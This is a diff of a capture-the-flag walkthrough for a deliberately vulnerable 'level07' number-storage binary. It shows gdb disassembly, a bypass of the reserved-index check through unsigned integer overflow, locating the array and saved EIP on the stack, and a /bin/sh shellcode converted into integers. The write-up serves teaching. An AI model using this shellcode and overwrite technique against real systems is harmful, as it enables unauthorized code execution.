@@ -1,18 +1,65 @@
-memset(argv, 0)
-memset(env, 0)
+# If we disass the main function we can see that at the start of the program every argv and env is set to 0
+# This prevent us to inject a shellcode in argv or in the env
 
-$> gdb level07
+# The program manipulate an array on the stack as passed it's adress in the functions `read_number` and `store_number`
 gdb> disass main
 [...]
-0x0804892b <+520>:	call   0x80486d7 <read_number>
+   0x08048924 <+513>:	lea    eax,[esp+0x24]
+   0x08048928 <+517>:	mov    DWORD PTR [esp],eax
+   0x0804892b <+520>:	call   0x80486d7 <read_number>    ; ret = read_number()
+[...]
+gdb> disass read_number
+[...]
+   0x080486fc <+37>:	shl    eax,0x2                    ; idx << 0x2 (idx * 4)
+   0x080486ff <+40>:	add    eax,DWORD PTR [ebp+0x8]    ; idx * 4 + array
+[...]
+gdb> disass store_number
+[...]
+   0x08048686 <+86>:	test   edx,edx                      ; idx % 3 == 0
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]     ; value
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7                     ; value >> 0x18 == 0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6    ; " *** ERROR! ***"
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>         ; puts(" *** ERROR! ***")
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8    ; "   This index is reserved for wil!"
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>         ; puts("   This index is reserved for wil!")
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6    ; " *** ERROR! ***"
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>         ; puts(" *** ERROR! ***")
+[...]
+   0x080486c5 <+149>:	shl    eax,0x2                      ; idx << 0x2 (idx * 4)
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]      ; idx * 4 + array
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+[...]
+# Here we can see that every 3 index is reserved
+# The array is indexed using pointer arithmetic so we can bypass the check using unsigned overflow
+
+# We will try to store a shellcode in the array then overwrite the `eip` to jump at the address of the array
+
+# First let's find the address of the array on the stack
+# Because gdb alter the address of the array we want to jump in we need to find a way to find it's address during runtime
+gdb> b read_number
+gdb> r
+[...]
+Input command: read
+# The array is load by the instruction `DWORD PTR [ebp+0x8]`
+gdb> x $ebp+0x8
+0xffffd5b0:	0xffffd5d4
+gdB> p/d (0xffffd5d4 - 0xffffd5b0) / 4
+$1 = 9
+# We need to read the index -9 to find the address of the array at runtime
+
+# Now we need to find where the eip is saved on the stack so we can overwrite it
+gdb> disass main
+[...]
+   0x0804892b <+520>:	call   0x80486d7 <read_number>    ; ret = read_number()
 [...]
 gdb> b *0x0804892b
 gdb> r
 [...]
 Input command: read
-[...]
-Guessed arguments:
-arg[0]: 0xffffd5d4 --> 0x0
 gdb> info frame
 [...]
  Saved registers:
@@ -20,26 +67,12 @@ gdb> info frame
 [...]
 gdb> p/d (0xffffd79c - 0xffffd5d4) / 4
 $1 = 114
-# 114 % 3 == 0 so it's a protected index
+# 114 % 3 == 0: It's a protected index
 
-# Because gdb alter the address of the array we want to jump in
-# we need to find another way to find it's address
 
-gdb> b read_number
-gdb> r
-[...]
-Input command: read
-gdb> x $ebp+8
-0xffffd5b0:	0xffffd5d4
-gdB> p/d (0xffffd5d4 - 0xffffd5b0) / 4
-$1 = 9
-# We need to read the index -9 to find the address of the array
-
-# We will use the following shellcode
-# \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
-
+# We will use the following shellcode \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+# We convert each 4 bytes to an integer
 $> python3
-# Shellcode to integers
 >>> 0xe1f7c931
 3791112497
 >>> 0x2f2f6851
@@ -53,14 +86,18 @@ $> python3
 >>> 0x80
 128
 
-# Overflow for protected index
+# Then we will use the fact that 2**32 overflow to 0 and ((2**32) / 4) % 3 == 1 to write at forbidden indexes
 >>> (2**32) / 4
 1073741824.0
->>> (2**32 + (4 * 3)) / 4
+>>> (2**32) / 4 + 3
 1073741827.0
->>> (2**32 + (4 * 114)) / 4
+>>> (2**32) / 4 + 114
 1073741938.0
+# We have everything we need
 
+# First we will store our shellcode in the index 0-5
+# Then we find the address of our array at index -9
+# Then we store the adddress of the array at the address of eip at index 114
 $> ./level07
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!
